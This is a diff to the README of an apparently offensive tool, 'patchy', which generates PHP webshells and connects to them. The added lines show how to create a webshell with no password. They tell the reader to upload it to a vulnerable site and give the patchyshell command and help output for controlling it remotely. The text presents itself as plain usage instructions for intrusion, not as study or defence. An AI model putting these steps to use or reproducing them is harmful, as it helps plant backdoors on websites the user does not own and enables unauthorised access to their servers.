@@ -72,6 +72,29 @@ $ patchygen -h
 Desc: Used to generate a webshell
 Required Usage: patchy genshell webshell_file webshell_name
 Optional Usage: [-p]: set a password for php shell
-	example: patshy genshell shell.php shell -p passw0rd!
+	example: patchy genshell shell.php shell -p passw0rd!
 		 patchy genshell /root/webshells/myshell.php nameofmyshell
 ```
+To generate a simple php webshell with no password just give a the webshell file path and the desired shell name:
+```
+patchygen ~/webshells/shell.php shellname
+```
+Upload the webshell to a vulnerable site and access it manually using a get request or patchyshell for easier access.
+```
+patchyshell http://somesite.com/shell.php shellname
+```
+patchyshell help page:
+```
+usage: accessshell.py [-h] [--password PASSWORD] target_url shell_name
+accessshell.py: error: the following arguments are required: target_url, shell_name
+Patricks-MacBook-Air:~ patrick$ patchyshell -h
+usage: accessshell.py [-h] [--password PASSWORD] target_url shell_name
+
+positional arguments:
+  target_url           The target URL
+  shell_name           Name of shell
+
+optional arguments:
+  -h, --help           show this help message and exit
+  --password PASSWORD  password for shell
+  ```
